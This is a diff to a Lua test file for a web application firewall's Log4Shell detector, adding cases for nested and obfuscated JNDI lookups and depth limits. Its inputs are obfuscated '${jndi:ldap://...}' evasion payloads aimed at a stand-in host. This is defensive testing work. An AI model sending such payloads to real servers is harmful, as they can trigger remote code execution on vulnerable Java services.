@@ -1846,23 +1846,47 @@ do
   local _, _, _, a3 = waf.check(fresh_ctx({ args = "x=${upper:J}ndi:ldap://e/a" }))
   check(a3 == "challenge_v2",                                    "74b: UPPER — challenge_v2 (got " .. tostring(a3) .. ")")
 
-  -- Env-default evasions from the public payload lists (a one-character
-  -- default glued to more text) are DEFAULT_VAL, not NESTED / ENV.
-  local glued = {
-    { args = "x=${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap://e/a}", want = "WAF_CVE:LOG4SHELL:DEFAULT_VAL" },
-    { args = "x=${env:FOO:-j}ndi:ldap://e/a",                             want = "WAF_CVE:LOG4SHELL:DEFAULT_VAL" },
+  -- Lookups that RESOLVE to a jndi lookup (defaults with any name length,
+  -- quoted date literals, case conversions nested inside) are RESOLVED.
+  local long = ("a"):rep(200)
+  local resolved = {
+    { args = "x=${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap://e/a}", want = "WAF_CVE:LOG4SHELL:RESOLVED" },
     { headers = { ["user-agent"] = "${${env:BARFOO:-j}ndi${env:BARFOO:-:}ldap://e/a}" },
-      want = "WAF_CVE:LOG4SHELL:DEFAULT_VAL:HDR:user-agent" },
+      want = "WAF_CVE:LOG4SHELL:RESOLVED:HDR:user-agent" },
+    { headers = { ["user-agent"] = "${${env:" .. long .. ":-j}ndi:ldap://e/a}" },
+      want = "WAF_CVE:LOG4SHELL:RESOLVED:HDR:user-agent" },
+    { headers = { ["x-api-version"] = "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:ldap://e/a}" },
+      want = "WAF_CVE:LOG4SHELL:RESOLVED:HDR:x-api-version" },
+    { args = "x=${${sys:x:-j}${sys:x:-n}di:ldap://e/a}",            want = "WAF_CVE:LOG4SHELL:RESOLVED" },
+    { args = "x=${${env:a:-${env:b:-j}}ndi:ldap://e/a}",           want = "WAF_CVE:LOG4SHELL:RESOLVED" },
   }
-  for i, c in ipairs(glued) do
+  for i, c in ipairs(resolved) do
     local _, r, _, a = waf.check(fresh_ctx({ args = c.args, headers = c.headers }))
-    check(r == c.want and a == "challenge_v2", "74b/glued " .. i .. ": " .. c.want .. " challenge_v2 (got " .. tostring(r) .. " " .. tostring(a) .. ")")
+    check(r == c.want and a == "challenge_v2", "74b/resolved " .. i .. ": " .. c.want .. " challenge_v2 (got " .. tostring(r) .. " " .. tostring(a) .. ")")
   end
-  -- A template's default is a value, not a glued letter: still weak.
-  for _, v in ipairs({ "x=${env:HOME:-/root}", "x=echo ${1:-x} done", "x=${sys:p:-8080}" }) do
-    local _, _, _, a = waf.check(fresh_ctx({ args = v }))
-    check(a == nil or a == "logonly", "74b: template default " .. v .. " — not enforced (got " .. tostring(a) .. ")")
+  -- Template / shell defaults resolve to plain text: not enforced. A glued
+  -- default with no outer ${ spells "jndi:" but no lookup: weak too.
+  for _, v in ipairs({ "x=${env:HOME:-/root}", "x=echo ${1:-x} done", "x=${sys:p:-8080}",
+                       "x=echo ${PREFIX:-/}usr/bin", "x=${env:FOO:-j}ndi:ldap://e/a",
+                       "tpl=`${${item}.name}`" }) do
+    local _, r, _, a = waf.check(fresh_ctx({ args = v }))
+    check(a == nil or a == "logonly", "74b: " .. v .. " — not enforced (got " .. tostring(r) .. " " .. tostring(a) .. ")")
   end
+  -- The unwrap is bounded (LOOKUP_PASSES = 8): a `j` 7 defaults deep still
+  -- resolves (7 + the jndi pass); one 9 deep runs out of passes with lookups
+  -- still nested, which is DEEP (enforced), not a pass.
+  local function nest(depth)
+    local inner = "j"
+    for _ = 1, depth do inner = "${env:a:-" .. inner .. "}" end
+    return "x=${" .. inner .. "ndi:ldap://e/a}"
+  end
+  local _, r7, _, a7 = waf.check(fresh_ctx({ args = nest(7) }))
+  check(r7 == "WAF_CVE:LOG4SHELL:RESOLVED" and a7 == "challenge_v2", "74b: 7 deep resolves (got " .. tostring(r7) .. " " .. tostring(a7) .. ")")
+  local _, r9, _, a9 = waf.check(fresh_ctx({ args = nest(9) }))
+  check(r9 == "WAF_CVE:LOG4SHELL:DEEP" and a9 == "challenge_v2", "74b: 9 deep — DEEP challenge_v2 (got " .. tostring(r9) .. " " .. tostring(a9) .. ")")
+  -- Many flat lookups (a long template) are not deep.
+  local _, rf, _, af = waf.check(fresh_ctx({ args = "x=" .. ("${env:a} "):rep(50) }))
+  check(rf == "WAF_CVE:LOG4SHELL:ENV" and af == "logonly", "74b: 50 flat lookups — ENV logonly (got " .. tostring(rf) .. " " .. tostring(af) .. ")")
 
   -- A weak tag elsewhere in the request must not mask a strong one.
   local mixed = {
